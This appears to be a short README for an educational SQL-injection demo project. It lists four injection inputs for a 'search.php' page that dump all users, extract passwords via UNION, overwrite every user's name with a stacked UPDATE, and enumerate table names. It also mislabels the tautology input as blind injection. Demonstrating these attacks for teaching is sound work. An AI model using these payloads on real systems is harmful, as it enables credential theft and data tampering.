# SQL-injection
This project was made to show how we can access,modify and delete database table entries with SQL injection entries.


SQL injection queries used in "search.php" page(used to print userid and name of the user with provided id) ->

1.) INPUT -> a' OR 1=1 # 
    USE -> This query is an example of BLIND SQLinjection.this condition will always be true.So, it'll print userid and name of            all users.
2.) INPUT -> a' UNION SELECT userid,password FROM users#
    USE -> This query is an example of UNION SQLinjection and will print userid and password of all users.
3.) INPUT -> 1';UPDATE users SET name='mnp' #
    USE -> This query is used to update the 'users' table and set name of all users to 'mnp'.
4.) INPUT -> a' UNION SELECT table_name,null FROM information_schema.tables #
    USE -> To print all the table names present in database at the moment.
